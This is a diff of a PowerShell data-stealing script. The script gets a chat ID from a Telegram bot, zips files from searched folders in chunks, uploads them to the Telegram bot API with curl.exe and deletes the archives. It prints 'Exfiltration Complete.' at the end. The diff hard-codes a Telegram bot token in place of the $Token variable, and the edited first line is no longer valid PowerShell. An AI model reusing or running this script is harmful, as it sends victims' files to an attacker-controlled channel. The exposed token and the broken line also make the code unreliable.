@@ -1,5 +1,5 @@
-﻿$Token = "$tg"
-$URL='https://api.telegram.org/bot{0}' -f $Token 
+﻿898931202:AAE_VBBpZ7E7gopuX7YAR-aNRsJB_s17abg = "$tg"
+$URL='https://api.telegram.org/bot{0}' -f 898931202:AAE_VBBpZ7E7gopuX7YAR-aNRsJB_s17abg 
 
 while($chatID.length -eq 0){
 $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
@@ -44,7 +44,7 @@ foreach ($folder in $foldersToSearch) {
             if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                 $zipArchive.Dispose()
                 $currentZipSize = 0
-                curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
+                curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot898931202:AAE_VBBpZ7E7gopuX7YAR-aNRsJB_s17abg/sendDocument"
                 Remove-Item -Path $zipFilePath -Force
                 Sleep 1
                 $index++
@@ -58,7 +58,7 @@ foreach ($folder in $foldersToSearch) {
     }
 }
 $zipArchive.Dispose()
-curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
+curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot898931202:AAE_VBBpZ7E7gopuX7YAR-aNRsJB_s17abg/sendDocument"
 Remove-Item -Path $zipFilePath -Force
 Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
 }
